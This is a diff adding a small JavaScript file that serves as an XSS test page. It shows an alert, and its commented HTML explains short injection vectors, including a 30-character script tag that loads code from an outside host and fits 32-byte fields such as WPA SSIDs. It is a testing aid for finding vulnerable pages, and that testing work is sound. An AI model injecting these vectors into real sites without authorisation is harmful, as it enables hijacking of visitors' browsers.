@@ -1,0 +1,22 @@
+alert("This page is XSS vulnerable."); //<br>
+console.log("This page is XSS vulnerable.");
+
+/*
+<br><br>
+<html>
+<head>
+	<link rel="icon" type="image/png" href="favicon.png" sizes="96x96">
+</head>
+<body style="font-family: monospace; margin-left: 20px;">
+<b>XSS test page</b>
+<p>
+This page can be embedded to test XSS atacks with little space available. The common shortest XSS vector is 
+<span style="background-color: #eee">&ltimg src=# onerror=alert()&gt</span> = 27 characters, but it allows for no custom alert message to be shown.<br>
+Use <span style="background-color: #eee">&ltscript src=//x33.li&gt&ltscript&gt</span> = 30 characters. The vector just fits into 32-byte limited fields (like WPA SSIDs). If the page is XSS-vulnerable an alert window will display "This page is XSS vulnerable".
+</p>
+<p>If you want your own code to be hosted under x33.li/x (which still fits into 32 bytes), you can use my <a href="http://tools.ciko.io/xsshost">xsshost service</a>.
+In case you have questions, drop me a note on  <a href="https://twitter.com/cyberanlage">Twitter</a>.
+<p>A project by <a href="https://ciko.io">ciko.io</a>.</p>
+</body>
+</html>
+*/
